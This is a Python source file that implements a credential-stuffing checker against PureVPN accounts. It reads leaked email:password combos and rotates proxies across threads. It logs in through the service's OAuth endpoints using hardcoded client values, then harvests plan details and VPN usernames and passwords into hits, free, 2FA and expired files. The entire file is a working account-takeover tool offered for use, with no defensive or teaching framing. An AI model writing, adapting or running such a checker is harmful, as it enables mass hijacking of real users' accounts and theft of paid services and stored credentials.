import requests
import threading
import time
import os
import ctypes
import random
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote
from colorama import Fore, Style, init

init(autoreset=True)

THREAD_COUNT = 10
RETRIES = 3
TIMEOUT = 30

checked = 0
hits = 0
free = 0
two_fa = 0
expired = 0
bad = 0
errors = 0
total_combos = 0
cpm = 0

print_lock = threading.Lock()
file_lock = threading.Lock()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
COMBOS_FILE = os.path.join(BASE_DIR, "combos.txt")
PROXIES_FILE = os.path.join(BASE_DIR, "proxies.txt")
HITS_FILE = os.path.join(BASE_DIR, "hits.txt")
FREE_FILE = os.path.join(BASE_DIR, "free.txt")
TWO_FA_FILE = os.path.join(BASE_DIR, "2fa.txt")
EXPIRED_FILE = os.path.join(BASE_DIR, "expired.txt")

CLIENT_ID = "a0724cd0-88bc-4326-a0ec-a2c210dfd908"
CODE_CHALLENGE = "Q5D1Qr0RAlZbVeXGTec24qj6FsW00cKS_LH01PFNGa8"
CODE_VERIFIER = "57c9d0cebb497ba4491400b6b8666181ac3f217c11889e55ea550285"
REDIRECT_URI = "https://bfidboloedlamgdmenmlbipfnccokknp.chromiumapp.org/oauth2"
TENANT_ID = "9707f41e-21a4-bbc5-dcbc-fdf6b61cc68f"

PLAN_MAP = {
    "9925395": "Standard",
    "11329606": "Max",
    "11329603": "Plus",
    "purevpn-standard": "Standard",
    "purevpn-plus": "Plus",
    "purevpn-max": "Max"
}

combos = []
proxies = []

def update_title():
    global checked, hits, free, expired, bad, cpm, total_combos
    start_time = time.time()
    while checked < total_combos:
        elapsed = time.time() - start_time
        if elapsed > 0:
            cpm = int((checked / elapsed) * 60)
        title = f"PureVPN Checker | Checked: {checked}/{total_combos} | Hits: {hits} | Free: {free} | 2FA: {two_fa} | Expired: {expired} | Bad: {bad} | CPM: {cpm}"
        ctypes.windll.kernel32.SetConsoleTitleW(title)
        time.sleep(0.5)

def get_proxy():
    if not proxies:
        return None
    
    proxy = random.choice(proxies)
    formatted_proxy = ""
    
    if "@" in proxy:
        if not any(proxy.startswith(proto) for proto in ["http://", "https://", "socks4://", "socks5://"]):
             formatted_proxy = f"http://{proxy}"
        else:
             formatted_proxy = proxy

    elif len(proxy.split(":")) >= 4:
        parts = proxy.split(":")
        if "." in parts[0]: 
            ip, port = parts[0], parts[1]
            user = parts[2]
            password = ":".join(parts[3:])
            formatted_proxy = f"http://{quote(user)}:{quote(password)}@{ip}:{port}"
        else:
            user, password = parts[0], parts[1]
            ip, port = parts[2], parts[3]
            formatted_proxy = f"http://{quote(user)}:{quote(password)}@{ip}:{port}"
            
    elif len(proxy.split(":")) == 2:
        formatted_proxy = f"http://{proxy}"
    else:
         formatted_proxy = f"http://{proxy}"

    return {"http": formatted_proxy, "https": formatted_proxy}

def log(status, message):
    with print_lock:
        colors = {
            "HIT": Fore.GREEN,
            "FREE": Fore.YELLOW,
            "EXPIRED": Fore.CYAN,
            "2FA": Fore.BLUE,
            "BAD": Fore.RED,
            "ERROR": Fore.MAGENTA
        }
        color = colors.get(status, Fore.WHITE)
        print(f"{color}[{status}] {Style.RESET_ALL}{message}")

def save_hit(filename, content):
    with file_lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(content + "\n")

def check_account(email, password):
    global checked, hits, free, two_fa, expired, bad, errors

    for _ in range(RETRIES):
        session = requests.Session()
        session.proxies = get_proxy() or {}
        
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
        })

        try:
            auth_url = "https://purevpn.fusionauth.io/oauth2/authorize"
            data = {
                "client_id": CLIENT_ID,
                "code_challenge": CODE_CHALLENGE,
                "code_challenge_method": "S256",
                "response_type": "code",
                "redirect_uri": REDIRECT_URI,
                "scope": "offline_access",
                "tenantId": TENANT_ID,
                "loginId": email,
                "password": password,
                "showPasswordField": "true"
            }

            resp = session.post(auth_url, data=data, allow_redirects=False, timeout=TIMEOUT)

            if "Invalid login credentials" in resp.text:
                bad += 1
                log("BAD", email)
                session.close()
                checked += 1
                return

            if "<title>Login | PureVPN</title>" in resp.text:
                bad += 1
                log("BAD", f"{email} (Failed)")
                session.close()
                checked += 1
                return

            if "two-factor" in resp.text.lower() or "verification code" in resp.text.lower():
                 two_fa += 1
                 log("2FA", email)
                 save_hit(TWO_FA_FILE, f"{email}:{password}")
                 session.close()
                 checked += 1
                 return

            if resp.status_code != 302:
                session.close()
                continue 

            location = resp.headers.get("Location", "")
            if "two-factor" in location:
                two_fa += 1
                log("2FA", email)
                save_hit(TWO_FA_FILE, f"{email}:{password}")
                session.close()
                checked += 1
                return

            if "code=" not in location:
                bad += 1
                log("BAD", f"{email} (No Code)")
                session.close()
                checked += 1
                return
            
            parsed = urlparse(location)
            code = parse_qs(parsed.query).get("code", [None])[0]

            if not code:
                bad += 1
                log("BAD", f"{email} (Invalid Code)")
                session.close()
                checked += 1
                return

            token_url = "https://purevpn.fusionauth.io/oauth2/token"
            token_data = {
                "client_id": CLIENT_ID,
                "code": code,
                "code_verifier": CODE_VERIFIER,
                "grant_type": "authorization_code",
                "redirect_uri": REDIRECT_URI
            }
            
            resp = session.post(token_url, data=token_data, timeout=TIMEOUT)
            if resp.status_code != 200:
                session.close()
                continue

            try:
                token_json = resp.json()
                access_token = token_json.get("access_token")
            except ValueError:
                session.close()
                continue

            if not access_token:
                session.close()
                continue

            userinfo_url = "https://purevpn.fusionauth.io/oauth2/userinfo"
            session.headers.update({"Authorization": f"Bearer {access_token}"})
            resp = session.get(userinfo_url, timeout=TIMEOUT)
            
            if resp.status_code != 200:
                session.close()
                continue

            try:
                userinfo_json = resp.json()
            except ValueError:
                session.close()
                continue
            
            
            u_data = userinfo_json.get("user", {})
            tf_methods = u_data.get("twoFactor", {}).get("methods", [])
            
            
            if len(tf_methods) > 0:
                 two_fa += 1
                 log("2FA", email)
                 save_hit(TWO_FA_FILE, f"{email}:{password}")
                 session.close()
                 checked += 1
                 return

            plans_list = []
            vpn_user = "N/A"
            vpn_pass = "N/A"
            is_free = False
            
            try:
                for grant in userinfo_json.get("entity_grants", []):
                    if grant.get("entity") == "vpn_premium":
                        info = grant.get("billing_info", {})
                        
                        p_name = info.get("plan", "N/A")
                        p_expiry = "N/A"
                        p_start_ts = 0
                        p_expiry_ts = 0
                        
                        if info.get("end_date"):
                             try:
                                dt = info.get("end_date").split("T")[0]
                                p_expiry = dt
                                p_expiry_ts = time.mktime(time.strptime(dt, "%Y-%m-%d"))
                             except: pass

                        vpn_user = info.get("vpn_username", vpn_user)
                        
                        if p_name != "N/A":
                             plans_list.append({
                                 "name": p_name,
                                 "expiry": p_expiry,
                                 "expiry_ts": p_expiry_ts,
                                 "start_ts": p_start_ts,
                                 "source": "fusionauth_grant"
                             })

                u_data = userinfo_json.get("user", {})
                if u_data.get("twoFactorEnabled") or u_data.get("twoFactor", {}).get("enabled"):
                     two_fa += 1
                     log("2FA", email)
                     save_hit(TWO_FA_FILE, f"{email}:{password}")
                     session.close()
                     checked += 1
                     return

                             
                b2c = userinfo_json.get("user", {}).get("data", {}).get("subscription", {}).get("b2c", [])
                if b2c:
                    for sub in b2c:
                        p_name = sub.get("plan", "N/A")
                        p_expiry = sub.get("expiry", "N/A")
                        p_expiry_ts = 0
                        p_start_ts = 0
                        
                        if p_expiry != "N/A":
                            try:
                                p_expiry_ts = time.mktime(time.strptime(p_expiry, "%Y-%m-%d"))
                            except: pass
                        
                        vpn_user = sub.get("vpnusername", vpn_user)
                        
                        if p_name != "N/A":
                            exists = False
                            for ex in plans_list:
                                if ex["name"] == p_name:
                                    exists = True
                                    if p_expiry != "N/A" and ex["expiry"] == "N/A":
                                         ex["expiry"] = p_expiry
                                         ex["expiry_ts"] = p_expiry_ts
                                    break
                            
                            if not exists:
                                plans_list.append({
                                    "name": p_name,
                                    "expiry": p_expiry,
                                    "expiry_ts": p_expiry_ts,
                                    "start_ts": p_start_ts,
                                    "source": "fusionauth_b2c"
                                })

            except Exception:
                pass

            sub_url = "https://api.purevpn.com/api/v1/user/subscription"
            resp = session.get(sub_url, timeout=TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    data = resp.json().get("data", {})
                    p_name = data.get("plan_name", "N/A")
                    
                    p_expiry_ts = data.get("expiry_date", 0)
                    p_expiry = "N/A"
                    if p_expiry_ts:
                        p_expiry = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(p_expiry_ts))
                    


                    is_free = data.get("is_free_user", False)

                    creds = data.get("vpn_credentials", {})
                    vpn_user = creds.get("username", vpn_user)
                    vpn_pass = creds.get("password", vpn_pass)
                    
                    found = False
                    for plan_item in plans_list:
                         if plan_item["name"] == p_name:
                              plan_item["start_ts"] = p_start_ts
                              if p_expiry != "N/A":
                                   plan_item["expiry"] = p_expiry
                                   plan_item["expiry_ts"] = p_expiry_ts
                              plan_item["source"] = "api_v1"
                              found = True
                              break
                    
                    if not found and p_name != "N/A":
                         plans_list.append({
                             "name": p_name,
                             "expiry": p_expiry,
                             "expiry_ts": p_expiry_ts,
                             "start_ts": p_start_ts,
                             "source": "api_v1"
                         })

                except ValueError:
                    session.close()
                    continue

            elif resp.status_code == 404:
                if not plans_list:
                     is_free = True
                     plans_list.append({
                         "name": "Free (No Subscription Profile)",
                         "expiry": "N/A",
                         "expiry_ts": 0,
                         "start_ts": 0,
                         "source": "api_404"
                     })
            else:
                 session.close()
                 continue
            
            final_plans = []
            current_time = time.time()
            all_expired = True
            if not plans_list and not is_free:
                 plans_list.append({
                     "name": "Free/Empty",
                     "expiry": "N/A",
                     "expiry_ts": 0,
                     "start_ts": 0
                 })

            seen_final_plans = set()

            for plan_item in plans_list:
                name = plan_item["name"]
                
                if str(name) in PLAN_MAP:
                    name = PLAN_MAP[str(name)]
                else:
                    n_lower = str(name).lower()
                    if "max" in n_lower:
                        name = "Max"
                    elif "plus" in n_lower:
                         name = "Plus"
                    elif "standard" in n_lower or "plan" in n_lower: 
                          name = "Standard"
                
                cycle = ""
                if plan_item["expiry_ts"] and plan_item["start_ts"]:
                    try:
                        days = (datetime.fromtimestamp(plan_item["expiry_ts"]) - datetime.fromtimestamp(plan_item["start_ts"])).days
                        if days < 28: cycle = f"{days} Days"
                        elif days <= 40: cycle = "Monthly"
                        elif 300 <= days <= 400: cycle = "Yearly"
                        elif 700 <= days <= 760: cycle = "2 Years"
                        elif 1800 <= days <= 1900: cycle = "5 Years"
                        else: cycle = f"{days} Days"
                    except: pass
                
                if cycle:
                    name = f"{name} ({cycle})"
                
                is_this_expired = False
                if plan_item["expiry_ts"] != 0 and plan_item["expiry_ts"] < current_time:
                     is_this_expired = True
                
                if "expired" in str(name).lower() or "no subscription" in str(name).lower():
                     is_this_expired = True
                
                if not name or str(name).strip() == "":
                     name = "Unknown Plan"

                if not is_this_expired:
                     all_expired = False
                     
                plan_str = f"{name} [Exp: {plan_item['expiry']}]"
                if plan_str not in seen_final_plans:
                     final_plans.append(plan_str)
                     seen_final_plans.add(plan_str)

            plan_string = ", ".join(final_plans)
            capture = f"Plan: {plan_string} | VPN User: {vpn_user} | VPN Pass: {vpn_pass}"
            line = f"{email}:{password} | {capture}"
            
            masked_pwd = "*" * 8
            masked_line = f"{email}:{masked_pwd} | {capture}"
            
            if is_free:
                free += 1
                log("FREE", masked_line)
                save_hit(FREE_FILE, line)

            elif all_expired:
                expired += 1 
                log("EXPIRED", masked_line)
                save_hit(EXPIRED_FILE, line)
            
            else:
                hits += 1
                log("HIT", masked_line)
                save_hit(HITS_FILE, f"{email}:{password}")
                save_hit("capture.txt", line)
            
            session.close()
            checked += 1
            return
        except Exception:
            session.close()
            continue
    
    errors += 1
    checked += 1

def worker():
    while True:
        with threading.Lock():
            if not combos:
                break
            email, password = combos.pop(0)
        check_account(email, password)

def main():
    global combos, proxies, total_combos

    os.system('cls' if os.name == 'nt' else 'clear')
    
    COLOR = "\033[38;2;200;199;255m"
    ascii_art = r"""
 █    ██  ██▓███  ▓█████▄  ██░ ██ 
 ██  ▓██▒▓██░  ██▒▒██▀ ██▌▓██░ ██▒
▓██  ▒██░▓██░ ██▓▒░██   █▌▒██▀▀██░
▓▓█  ░██░▒██▄█▓▒ ▒░▓█▄   ▌░▓█ ░██ 
▒▒█████▓ ▒██▒ ░  ░░▒████▓ ░▓█▒░██▓
░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░ ▒▒▓  ▒  ▒ ░░▒░▒
░░▒░ ░ ░ ░▒ ░      ░ ▒  ▒  ▒ ░▒░ ░
 ░░░ ░ ░ ░░        ░ ░  ░  ░  ░░ ░
   ░                 ░     ░  ░  ░
                   ░                                                                                                    
"""
    print(f"{COLOR}{ascii_art}{Style.RESET_ALL}")

    if not os.path.exists(COMBOS_FILE):
        open(COMBOS_FILE, "w").close()
        print(f"{Fore.RED}No combos.txt found. Created one.{Style.RESET_ALL}")
        return

    with open(COMBOS_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    email, password = parts[0].strip(), parts[1].strip()
                    if "@" in email and "." in email and len(password) > 0:
                        combos.append((email, password))
    
    total_combos = len(combos)
    print(f"{Fore.YELLOW}Loaded {total_combos} combos.{Style.RESET_ALL}")

    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"{Fore.YELLOW}Loaded {len(proxies)} proxies.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}No proxies.txt found. Running proxyless.{Style.RESET_ALL}")

    threading.Thread(target=update_title, daemon=True).start()

    print(f"{Fore.CYAN}Starting {THREAD_COUNT} threads...{Style.RESET_ALL}")
    
    threads = []
    for _ in range(min(THREAD_COUNT, total_combos)):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"\n{Fore.GREEN}Finished Checking.{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Hits: {hits} | Free: {free} | 2FA: {two_fa} | Expired: {expired} | Bad: {bad} | Errors: {errors}{Style.RESET_ALL}")
    input("Press Enter to Exit...")

if __name__ == "__main__":
    main()
